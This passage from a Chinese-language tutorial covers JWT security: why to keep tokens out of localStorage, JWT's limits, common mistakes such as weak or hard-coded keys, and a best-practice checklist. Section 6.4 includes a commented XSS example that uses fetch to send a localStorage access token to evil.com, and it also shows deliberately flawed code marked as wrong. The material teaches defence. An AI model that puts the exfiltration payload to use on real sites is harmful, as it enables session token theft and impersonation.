            new LoginResponse(newAccessToken, userInfo)));
}
```

### 6.4 为什么不推荐 localStorage

```javascript
// ❌ 危险：localStorage 存储 Token
localStorage.setItem('accessToken', token);

// 原因：任何 XSS 攻击都能轻松窃取！
// 假设你的页面有一个 XSS 漏洞：
// <script>
//   fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'));
// </script>
// → 攻击者获得了你的 Token，可以冒充你做任何事

// ✅ 安全：内存存储
let accessToken = null;  // 私有变量，外部不可访问

export function setToken(token) { accessToken = token; }
export function getToken() { return accessToken; }

// 内存存储的缺点：刷新页面后丢失
// 解决方案：
// 1. 使用 Refresh Token (HttpOnly Cookie) 静默获取新的 Access Token
// 2. 页面加载时调用 /api/auth/refresh 获取新令牌
// 3. 使用 Service Worker 在后台保持 Token
```

---

## 7. JWT 的局限性

### 7.1 JWT 不能做的事

```
┌─────────────────────────────────────────────────────────┐
│               JWT 不是银弹                                │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ❌ JWT 不是加密！                                        │
│      Payload 是 Base64URL 编码，任何人都能解码查看内容       │
│      → 不要放敏感数据！                                   │
│                                                         │
│  ❌ JWT 不支持"踢人下线"                                   │
│      签发的 JWT 在过期前一直有效，服务器无法主动使其失效        │
│      → 需要配合黑名单或缩短过期时间                         │
│                                                         │
│  ❌ JWT 不适合存大量数据                                   │
│      HTTP Header 通常有大小限制（4KB-8KB）                  │
│      每次请求都携带完整的 JWT，增加带宽消耗                   │
│                                                         │
│  ❌ JWT 无法完全替代 Session                               │
│      Session 可以存任意数据，可以随时修改，可以随时删除        │
│      JWT 一旦签发就无法修改                                │
│                                                         │
│  ❌ JWT 不解决 CSRF 问题                                  │
│      反而可能引入新的 CSRF 风险（取决于存储方式）              │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 7.2 常见的安全误区

**误区一：在 Payload 中放密码**

```json
// ❌ 千万别这样做！
{
  "username": "john",
  "password": "plaintext123"  // 任何人都能解码看到！
}

// ✅ Payload 只放非敏感的标识信息
{
  "sub": "12345",
  "roles": ["USER"]
}
```

**误区二：使用弱密钥**

```java
// ❌ 弱密钥
String secret = "secret";  // 太短、太简单

// ❌ 密钥硬编码
String secret = "my-application-secret-key-2024";

// ✅ 至少 256 位（32 字节）的随机密钥
// 生成方式：
// openssl rand -base64 32
// 或：
// java -cp ... 生成 UUID 拼接

// ✅ 从环境变量注入
@Value("${JWT_SECRET}")  // K8s Secret / Vault
private String secret;
```

**误区三：不区分 Token 类型**

```java
// ❌ 用户可以拿 Refresh Token 当 Access Token 用
@PostMapping("/refresh")
public ResponseEntity refresh(@RequestBody RefreshRequest request) {
    String token = request.getRefreshToken();
    // 没有检查 Token 是否是 Refresh 类型！
    // Access Token 也可能被误传到这里
}

// ✅ 加入类型检查
Claims claims = parseToken(token);
if (!"refresh".equals(claims.get("type"))) {
    throw new IllegalArgumentException("Token 类型错误");
}
```

**误区四：无限制的刷新**

```java
// ❌ 允许同一个 Refresh Token 无限次刷新
// → 攻击者可以无限维持访问权限

// ✅ Refresh Token Rotation
// 每次刷新都生成新的 Refresh Token，旧的立即失效
// 能检测到 Refresh Token 被重复使用（可能是攻击）
```

### 7.3 什么时候不应该用 JWT

| 场景 | 建议 |
|------|------|
| 服务端渲染的传统 Web 应用 | 用 Session + Cookie，更简单安全 |
| 需要实时踢人下线 | Session 更合适（服务端可控） |
| 需要在服务端存储大量用户上下文 | Session 有更大的存储空间 |
| 系统只有单体应用 | Session 更简单，没有额外复杂度 |
| 高并发但 Token 很大的场景 | 减少 Payload，或考虑其他方案 |
| 需要精细的权限实时变更 | JWT 是静态的，需要额外机制 |

### 7.4 JWT 最佳实践总结

```
安全最佳实践 Checklist：

□ 使用 RS256/ES256 而非 HS256（微服务场景）
□ 密钥长度 ≥ 256 位
□ 密钥从环境变量/配置中心读取，不硬编码
□ 定期轮换签名密钥
□ Access Token 有效期 ≤ 15 分钟
□ Refresh Token 有效期 ≤ 7 天
□ 使用 Refresh Token Rotation
□ 不在 Payload 中存敏感数据
□ 不在 URL 中传递 Token
□ Access Token 返回在响应体中（前端存内存）
□ Refresh Token 使用 HttpOnly + Secure + SameSite Cookie
□ 实现 Token 黑名单/白名单
□ 登出时立即撤销 Refresh Token
□ 修改密码后撤销所有 Token
□ 记录所有 Token 的签发和刷新日志
□ 区分 Token 过期（TOKEN_EXPIRED）和 Token 无效（TOKEN_INVALID）
□ 前端实现并发刷新保护（Promise 缓存）
□ 后端实现并发刷新保护（分布式锁）
```

---

## 总结

JWT 是一个强大的工具，但它不是银弹。成功的 JWT 实践需要：

1. **理解本质**：JWT 是自包含的声明集合，核心在于签名验证
2. **双令牌设计**：短命的 Access Token + 可控的 Refresh Token
3. **安全存储**：前端内存 + HttpOnly Cookie，分而治之
4. **撤销机制**：通过白名单/黑名单弥补 JWT 不可撤销的短板
5. **防范并发**：分布式锁 + 前端 Promise 缓存，双重保障
6. **持续优化**：密钥轮换、Token Rotation、异常检测

把 JWT 用好的关键在于：**把它当作分布式系统中的身份凭证，而不是万能的安全工具。**